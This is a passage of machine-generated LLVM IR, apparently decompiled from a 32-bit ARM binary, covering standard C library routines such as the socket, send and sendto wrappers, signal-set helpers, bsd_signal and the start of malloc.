  %v12_12e10 = load i32, i32* @r7, align 4
  %v15_12e10 = load i32, i32* @r8, align 4
  %v18_12e10 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @ip, align 4
  %v4_12e1c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 12772) to i32*), align 4
  %v2_12e20 = icmp eq i32 %v4_12e1c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_12e20, label %dec_label_pc_12e38, label %entry.dec_label_pc_12e40_crit_edge

entry.dec_label_pc_12e40_crit_edge:               ; preds = %entry
  br label %dec_label_pc_12e40

dec_label_pc_12e38:                               ; preds = %entry
  store i32 %v3_12e10, i32* @r4, align 4
  store i32 %v9_12e10, i32* @r6, align 4
  store i32 %v12_12e10, i32* @r7, align 4
  store i32 %v15_12e10, i32* @r8, align 4
  %v0_12e3c = call i32 @__sys_send()
  br label %dec_label_pc_12e40

dec_label_pc_12e40:                               ; preds = %entry.dec_label_pc_12e40_crit_edge, %dec_label_pc_12e38
  %v0_12e40 = call i32 @__libc_enable_asynccancel()
  %v0_12e44 = load i32, i32* @r6, align 4
  store i32 %v0_12e44, i32* @r1, align 4
  store i32 %v0_12e40, i32* @r5, align 4
  %v0_12e50 = load i32, i32* @r8, align 4
  store i32 %v0_12e50, i32* @r3, align 4
  %v0_12e54 = load i32, i32* @r4, align 4
  store i32 %v0_12e54, i32* @r0, align 4
  %v0_12e58 = call i32 @__sys_send()
  store i32 %v0_12e58, i32* @r4, align 4
  %v0_12e60 = load i32, i32* @r5, align 4
  %v1_12e64 = call i32 @__libc_disable_asynccancel(i32 %v0_12e60)
  %v0_12e68 = load i32, i32* @r4, align 4
  %v2_12e6c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12e6c, i32* @r4, align 4
  store i32 %v6_12e10, i32* @r5, align 4
  store i32 %v9_12e10, i32* @r6, align 4
  store i32 %v12_12e10, i32* @r7, align 4
  store i32 %v15_12e10, i32* @r8, align 4
  store i32 %v18_12e10, i32* @lr, align 4
  ret i32 %v0_12e68

; uselistorder directives
  uselistorder label %dec_label_pc_12e40, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12e7c = load i32, i32* @r4, align 4
  store i32 %v3_12e7c, i32* %stack_var_-16, align 4
  %v0_12e90 = load i32, i32* @r0, align 4
  store i32 %v0_12e90, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12e90, -4095
  br i1 %tmp, label %dec_label_pc_12eb8, label %dec_label_pc_12ea0

dec_label_pc_12ea0:                               ; preds = %entry
  %v0_12ea4 = call i32 @__aeabi_read_tp()
  %v3_12ea8 = load i16, i16* @global_var_23068.362, align 2
  %v4_12ea8 = sext i16 %v3_12ea8 to i32
  %v0_12eac = load i32, i32* %r2.global-to-local, align 4
  %v1_12eac = sub i32 0, %v0_12eac
  store i32 %v1_12eac, i32* %r2.global-to-local, align 4
  %v3_12eb0 = add i32 %v4_12ea8, %v0_12ea4
  %v4_12eb0 = inttoptr i32 %v3_12eb0 to i32*
  store i32 %v1_12eac, i32* %v4_12eb0, align 4
  %v2_12eb8.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_12eb8

dec_label_pc_12eb8:                               ; preds = %entry, %dec_label_pc_12ea0
  %v1_12ebc = phi i32 [ %v0_12e90, %entry ], [ -1, %dec_label_pc_12ea0 ]
  %v2_12eb8 = phi i32 [ %v3_12e7c, %entry ], [ %v2_12eb8.pre, %dec_label_pc_12ea0 ]
  store i32 %v2_12eb8, i32* @r4, align 4
  ret i32 %v1_12ebc

; uselistorder directives
  uselistorder i32 %v0_12e90, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12eb8, { 1, 0 }
}

define i32 @"$d.2"(i16 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12ec0:
  %r0.global-to-local = alloca i32, align 4
  %tmp = sext i16 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_12ec0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12ec0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12ec0
  %tmp2 = inttoptr i32 %arg2 to i16*
  %v5_12ec0 = udiv i32 %arg3, 4
  %v6_12ec0 = and i32 %v5_12ec0, %tmp
  store i32 %v6_12ec0, i32* %r0.global-to-local, align 4
  %v2_12ec4 = trunc i32 %v6_12ec0 to i16
  store i16 %v2_12ec4, i16* %tmp2, align 2
  %v10_12ec4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12ec0, %bb
  %v10_12ec4 = phi i32 [ %tmp, %dec_label_pc_12ec0 ], [ %v10_12ec4.pre, %bb ]
  ret i32 %v10_12ec4

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12ec8 = load i32, i32* @r4, align 4
  store i32 %v3_12ec8, i32* %stack_var_-32, align 4
  %v9_12ec8 = load i32, i32* @r6, align 4
  %v12_12ec8 = load i32, i32* @r7, align 4
  %v15_12ec8 = load i32, i32* @r8, align 4
  %v18_12ec8 = load i32, i32* @sb, align 4
  %v21_12ec8 = load i32, i32* @sl, align 4
  %v24_12ec8 = load i32, i32* @lr, align 4
  %v4_12ed8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 12772) to i32*), align 4
  %v2_12ee0 = icmp eq i32 %v4_12ed8, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_12ee0, label %dec_label_pc_12f00, label %dec_label_pc_12f0c

dec_label_pc_12f00:                               ; preds = %entry
  store i32 %v3_12ec8, i32* @r4, align 4
  store i32 %v12_12ec8, i32* @r7, align 4
  store i32 %v15_12ec8, i32* @r8, align 4
  store i32 %v18_12ec8, i32* %sb.global-to-local, align 4
  %v0_12f08 = call i32 @__sys_sendto()
  br label %dec_label_pc_12f0c

dec_label_pc_12f0c:                               ; preds = %entry, %dec_label_pc_12f00
  %v0_12f0c = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12f0c, i32* @r5, align 4
  %v0_12f20 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_12f20, i32* @r0, align 4
  %v0_12f28 = call i32 @__sys_sendto()
  store i32 %v0_12f28, i32* @r4, align 4
  %v0_12f30 = load i32, i32* @r5, align 4
  %v1_12f34 = call i32 @__libc_disable_asynccancel(i32 %v0_12f30)
  %v0_12f38 = load i32, i32* @r4, align 4
  %v2_12f40 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12f40, i32* @r4, align 4
  store i32 %v9_12ec8, i32* @r6, align 4
  store i32 %v12_12ec8, i32* @r7, align 4
  store i32 %v15_12ec8, i32* @r8, align 4
  store i32 %v18_12ec8, i32* @sb, align 4
  store i32 %v21_12ec8, i32* @sl, align 4
  store i32 %v24_12ec8, i32* @lr, align 4
  ret i32 %v0_12f38

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12f0c, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12f50 = load i32, i32* @r4, align 4
  store i32 %v3_12f50, i32* %stack_var_-12, align 4
  %v0_12f60 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12f60, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12f60, -4095
  br i1 %tmp, label %dec_label_pc_12f88, label %dec_label_pc_12f70

dec_label_pc_12f70:                               ; preds = %entry
  %v0_12f74 = call i32 @__aeabi_read_tp()
  %v3_12f78 = load i16, i16* @global_var_23068.362, align 2
  %v4_12f78 = sext i16 %v3_12f78 to i32
  %v0_12f7c = load i32, i32* %r2.global-to-local, align 4
  %v1_12f7c = sub i32 0, %v0_12f7c
  store i32 %v1_12f7c, i32* %r2.global-to-local, align 4
  %v3_12f80 = add i32 %v4_12f78, %v0_12f74
  %v4_12f80 = inttoptr i32 %v3_12f80 to i32*
  store i32 %v1_12f7c, i32* %v4_12f80, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12f88.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12f88

dec_label_pc_12f88:                               ; preds = %entry, %dec_label_pc_12f70
  %v1_12f8c = phi i32 [ %v0_12f60, %entry ], [ -1, %dec_label_pc_12f70 ]
  %v2_12f88 = phi i32 [ %v3_12f50, %entry ], [ %v2_12f88.pre, %dec_label_pc_12f70 ]
  store i32 %v2_12f88, i32* @r4, align 4
  ret i32 %v1_12f8c

; uselistorder directives
  uselistorder i32 %v0_12f60, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12f88, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12f90:
  %v0_12f90 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12f90, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12f90
  %v2_12f94 = load i32, i32* @r8, align 4
  %v3_12f94 = udiv i32 %v2_12f94, 2
  %v4_12f94 = shl i32 %v2_12f94, 31
  %v5_12f94 = or i32 %v3_12f94, %v4_12f94
  %v8_12f94 = and i32 %v5_12f94, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12f90, %bb
  %v9_12f94 = phi i32 [ %arg1, %dec_label_pc_12f90 ], [ %v8_12f94, %bb ]
  ret i32 %v9_12f94

; uselistorder directives
  uselistorder i32 %v2_12f94, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12f98 = load i32, i32* @r7, align 4
  store i32 %v3_12f98, i32* %stack_var_-8, align 4
  %v0_12fa4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12fa4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12fa4, -4095
  br i1 %tmp, label %dec_label_pc_12fcc, label %dec_label_pc_12fb4

dec_label_pc_12fb4:                               ; preds = %entry
  %v0_12fb8 = call i32 @__aeabi_read_tp()
  %v3_12fbc = load i16, i16* @global_var_23068.362, align 2
  %v4_12fbc = sext i16 %v3_12fbc to i32
  store i32 %v4_12fbc, i32* @r3, align 4
  %v0_12fc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_12fc0 = sub i32 0, %v0_12fc0
  store i32 %v1_12fc0, i32* %r2.global-to-local, align 4
  %v3_12fc4 = add i32 %v4_12fbc, %v0_12fb8
  %v4_12fc4 = inttoptr i32 %v3_12fc4 to i32*
  store i32 %v1_12fc0, i32* %v4_12fc4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12fcc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12fcc

dec_label_pc_12fcc:                               ; preds = %entry, %dec_label_pc_12fb4
  %v1_12fd0 = phi i32 [ %v0_12fa4, %entry ], [ -1, %dec_label_pc_12fb4 ]
  %v2_12fcc = phi i32 [ %v3_12f98, %entry ], [ %v2_12fcc.pre, %dec_label_pc_12fb4 ]
  store i32 %v2_12fcc, i32* @r7, align 4
  ret i32 %v1_12fd0

; uselistorder directives
  uselistorder i32 %v0_12fa4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12fcc, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12fd4:
  %v0_12fd4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12fd4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12fd4
  %v2_12fd8 = load i32, i32* @r4, align 4
  %v5_12fd8 = udiv i32 %v2_12fd8, 2
  %v6_12fd8 = and i32 %v5_12fd8, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12fd4, %bb
  %v7_12fd8 = phi i32 [ %arg1, %dec_label_pc_12fd4 ], [ %v6_12fd8, %bb ]
  ret i32 %v7_12fd8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_12ff4, label %dec_label_pc_12fec

dec_label_pc_12fec:                               ; preds = %entry
  %v7_12ff0 = icmp slt i32 %arg1, 65
  br i1 %v7_12ff0, label %dec_label_pc_13010, label %dec_label_pc_12ff4

dec_label_pc_12ff4:                               ; preds = %dec_label_pc_12fec, %entry
  %v0_12ff8 = call i32 @__aeabi_read_tp()
  %v3_12ffc = load i16, i16* @global_var_23068.362, align 2
  %v4_12ffc = sext i16 %v3_12ffc to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_13008 = add i32 %v4_12ffc, %v0_12ff8
  %v4_13008 = inttoptr i32 %v3_13008 to i32*
  store i32 22, i32* %v4_13008, align 4
  %v0_13018.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13018

dec_label_pc_13010:                               ; preds = %dec_label_pc_12fec
  %v0_13010 = call i32 @__sigaddset()
  store i32 %v0_13010, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13018

dec_label_pc_13018:                               ; preds = %dec_label_pc_12ff4, %dec_label_pc_13010
  %v0_13018 = phi i32 [ %v0_13018.pre, %dec_label_pc_12ff4 ], [ %v0_13010, %dec_label_pc_13010 ]
  ret i32 %v0_13018

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13018, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_13034 = add i32 %tmp, 4
  %v3_13034 = inttoptr i32 %v2_13034 to i32*
  store i32 0, i32* %v3_13034, align 4
  %v1_13038 = load i32, i32* %r3.global-to-local, align 4
  %v2_13038 = inttoptr i32 %v1_13038 to i32*
  store i32 0, i32* %v2_13038, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13040 = load i32, i32* @r4, align 4
  store i32 %v3_13040, i32* %stack_var_-16, align 4
  %v6_13040 = load i32, i32* @r5, align 4
  %v9_13040 = load i32, i32* @r6, align 4
  %v7_13048 = icmp eq i32 %arg2, -1
  br i1 %v7_13048, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_13050 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_1306c

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_13074

dec_label_pc_1306c:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @r6, align 4
  %v7_13070 = icmp slt i32 %arg1, 65
  br i1 %v7_13070, label %dec_label_pc_13090, label %dec_label_pc_13074

dec_label_pc_13074:                               ; preds = %.thread16, %dec_label_pc_1306c
  %v0_13078 = call i32 @__aeabi_read_tp()
  %v3_1307c = load i16, i16* @global_var_23068.362, align 2
  %v4_1307c = sext i16 %v3_1307c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_13088 = add i32 %v4_1307c, %v0_13078
  %v4_13088 = inttoptr i32 %v3_13088 to i32*
  store i32 22, i32* %v4_13088, align 4
  %v0_130e8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_13090:                               ; preds = %dec_label_pc_1306c
  %v2_13090 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13090, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_13098 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_13098, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_130a8 = call i32 @__sigaddset()
  %v0_130b0 = load i32, i32* @r5, align 4
  store i32 %v0_130b0, i32* %r1.global-to-local, align 4
  %v0_130b4 = load i32, i32* @r6, align 4
  %v2_130b4 = add i32 %v0_130b4, 11868
  %v2_130b8 = call i32 @__GI___sigismember(i32 %v2_130b4, i32 %v0_130b0)
  store i32 %v2_13090, i32* %r1.global-to-local, align 4
  %v0_130cc = load i32, i32* @r5, align 4
  %v3_130d8 = call i32 @__libc_sigaction(i32 %v0_130cc, i32 %v2_13090, i32 %v2_13050)
  %v1_130dc = icmp slt i32 %v3_130d8, 0
  br i1 %v1_130dc, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_13090
  %v5_130e0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_130e0, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_13090
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_13074, %bb32
  %v0_130e8 = phi i32 [ %v5_130e0, %bb31 ], [ %v0_130e8.pre, %dec_label_pc_13074 ], [ -1, %bb32 ]
  %v2_130f0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_130f0, i32* @r4, align 4
  store i32 %v6_13040, i32* @r5, align 4
  store i32 %v9_13040, i32* @r6, align 4
  ret i32 %v0_130e8

; uselistorder directives
  uselistorder i32 %v2_13090, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 65, { 0, 1, 3, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13074, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_13104 = add i32 %arg2, -1
  %v3_13108 = udiv i32 %v1_13104, 32
  %v4_1310c = mul nuw nsw i32 %v3_13108, 4
  %v5_1310c = add i32 %v4_1310c, %arg1
  %v6_1310c = inttoptr i32 %v5_1310c to i32*
  %v7_1310c = load i32, i32* %v6_1310c, align 4
  %v1_13110 = urem i32 %v1_13104, 32
  %v7_13118 = shl i32 1, %v1_13110
  %v8_13118 = and i32 %v7_1310c, %v7_13118
  %v10_13118 = icmp ne i32 %v8_13118, 0
  %. = zext i1 %v10_13118 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_13104, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_13128 = load i32, i32* @r1, align 4
  %v1_13128 = add i32 %v0_13128, -1
  %v3_1312c = udiv i32 %v1_13128, 32
  %v0_13130 = load i32, i32* @r0, align 4
  %v4_13130 = mul nuw nsw i32 %v3_1312c, 4
  %v5_13130 = add i32 %v0_13130, %v4_13130
  %v6_13130 = inttoptr i32 %v5_13130 to i32*
  %v7_13130 = load i32, i32* %v6_13130, align 4
  %v1_13134 = urem i32 %v1_13128, 32
  %v7_1313c = shl i32 1, %v1_13134
  %v8_1313c = or i32 %v7_13130, %v7_1313c
  store i32 %v8_1313c, i32* %v6_13130, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13128, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1314c = add i32 %arg2, -1
  %v3_13150 = udiv i32 %v1_1314c, 32
  %v4_13154 = mul nuw nsw i32 %v3_13150, 4
  %v5_13154 = add i32 %v4_13154, %arg1
  %v6_13154 = inttoptr i32 %v5_13154 to i32*
  %v7_13154 = load i32, i32* %v6_13154, align 4
  %v1_13158 = urem i32 %v1_1314c, 32
  %tmp = shl i32 -1, %v1_13158
  %v8_13160 = add i32 %tmp, -1
  %v9_13160 = and i32 %v7_13154, %v8_13160
  store i32 %v9_13160, i32* %v6_13154, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1314c, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_13170 = udiv i32 %arg1, 256
  store i32 %v3_13170, i32* %r1.global-to-local, align 4
  %v2_13174 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_13174, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_13180 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_13174, i32 %v0_13180)
  %v0_13184 = load i32, i32* %r1.global-to-local, align 4
  %v1_13184 = add i32 %v0_13184, 1048320
  %v3_13188 = udiv i32 %v1_13184, 65536
  %v1_1318c = and i32 %v3_13188, 8
  %v6_13190 = shl i32 %v0_13184, %v1_1318c
  %v1_13194 = add i32 %v6_13190, 520192
  %v3_13198 = udiv i32 %v1_13194, 65536
  %v1_1319c = and i32 %v3_13198, 4
  %v6_131a0 = shl i32 %v6_13190, %v1_1319c
  %v1_131a4 = add i32 %v6_131a0, 245760
  %v3_131a8 = udiv i32 %v1_131a4, 65536
  %v1_131ac = and i32 %v3_131a8, 2
  %v6_131b0 = shl i32 %v6_131a0, %v1_131ac
  store i32 %v6_131b0, i32* %r1.global-to-local, align 4
  %v1_131b4 = sub nsw i32 13, %v1_1318c
  %v2_131b8 = sub nsw i32 %v1_131b4, %v1_1319c
  %v3_131bc = udiv i32 %v6_131b0, 32768
  %v4_131bc = sub nuw nsw i32 -1, %v3_131bc
  %v4_131c0 = udiv i32 %v6_131b0, 16384
  %v5_131c0 = and i32 %v4_131c0, %v4_131bc
  %v2_131c4 = sub nsw i32 %v2_131b8, %v1_131ac
  %v2_131c8 = add nsw i32 %v2_131c4, %v5_131c0
  %v1_131cc = add nsw i32 %v2_131c8, 6
  %v0_131d0 = load i32, i32* %ip.global-to-local, align 4
  %v6_131d0 = lshr i32 %v0_131d0, %v1_131cc
  %v3_131d4 = mul nsw i32 %v2_131c8, 4
  %v1_131d8 = add nsw i32 %v3_131d4, 32
  %v1_131dc = urem i32 %v6_131d0, 4
  %v2_131e0 = or i32 %v1_131dc, %v1_131d8
  ret i32 %v2_131e0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_131e8 = load i32, i32* @r4, align 4
  %v6_131e8 = load i32, i32* @r5, align 4
  %v9_131e8 = load i32, i32* @r6, align 4
  %v12_131e8 = load i32, i32* @r7, align 4
  %v15_131e8 = load i32, i32* @r8, align 4
  %v18_131e8 = load i32, i32* @sb, align 4
  %v21_131e8 = load i32, i32* @sl, align 4
  %v24_131e8 = load i32, i32* @fp, align 4
  %v27_131e8 = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r1.global-to-local, align 4
  %v4_131fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 108) to i32*), align 4
  store i32 %v4_131fc, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_13208 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 68) to i32*), align 4
  store i32 %v4_13208, i32* %r1.global-to-local, align 4
  %v0_1320c = load i32, i32* @r0, align 4
  store i32 %v0_1320c, i32* @r5, align 4
  store i32 %v4_131fc, i32* %r2.global-to-local, align 4
  %v2_13214 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_13214, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %ip.global-to-local, align 4
  %v4_13220 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 112) to i32*), align 4
  store i32 %v4_13220, i32* %ip.global-to-local, align 4
  store i32 78380, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13220)
  %v0_1322c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1322c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @r1, align 4
  %v4_13238 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 16) to i32*), align 4
  store i32 %v4_13238, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_13244.453 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13238)
  %v0_13244 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_13244, -32
  br i1 %tmp, label %dec_label_pc_13268, label %dec_label_pc_1324c

dec_label_pc_1324c:                               ; preds = %entry
  store i32 65036, i32* %r2.global-to-local, align 4
  %v0_13250 = call i32 @__aeabi_read_tp()
  store i32 %v0_13250, i32* %r0.global-to-local, align 4
  %v3_13254 = load i16, i16* @global_var_23068.362, align 2
  %v4_13254 = sext i16 %v3_13254 to i32
  store i32 %v4_13254, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_13260 = add i32 %v4_13254, %v0_13250
  %v4_13260 = inttoptr i32 %v3_13260 to i32*
  store i32 12, i32* %v4_13260, align 4
  br label %dec_label_pc_13aec

dec_label_pc_13268:                               ; preds = %entry
  %v1_13268 = add i32 %v0_13244, 11
  store i32 %v1_13268, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r2.global-to-local, align 4
  %v2_13274 = icmp ugt i32 %v1_13268, 14
  %v7_13274 = icmp eq i32 %v1_13268, 15
  %v2_13278 = xor i1 %v7_13274, true
  %v3_13278 = and i1 %v2_13274, %v2_13278
  br i1 %v3_13278, label %bb, label %bb142

bb:                                               ; preds = %dec_label_pc_13268
  %v5_13278 = and i32 %v1_13268, -8
  store i32 %v5_13278, i32* @sl, align 4
  br label %bb142

bb142:                                            ; preds = %dec_label_pc_13268, %bb
  %v4_1327c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 64) to i32*), align 4
  store i32 %v4_1327c, i32* @r0, align 4
  %v1_13280 = inttoptr i32 %v4_1327c to i32*
  %v2_13280 = load i32, i32* %v1_13280, align 4
  store i32 %v2_13280, i32* @r4, align 4
  %v2_13284 = xor i1 %v2_13274, true
  %v3_13284 = or i1 %v7_13274, %v2_13284
  br i1 %v3_13284, label %bb143, label %bb144

bb143:                                            ; preds = %bb142
  store i32 16, i32* @sl, align 4
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v1_13288 = urem i32 %v2_13280, 2
  %v2_13288 = icmp eq i32 %v1_13288, 0
  br i1 %v2_13288, label %dec_label_pc_13290, label %dec_label_pc_132a0

dec_label_pc_13290:                               ; preds = %bb144
  %v2_13290 = icmp eq i32 %v2_13280, 0
  br i1 %v2_13290, label %dec_label_pc_13298, label %dec_label_pc_1367c

dec_label_pc_13298:                               ; preds = %dec_label_pc_13290
  %v0_13298 = call i32 @__malloc_consolidate()
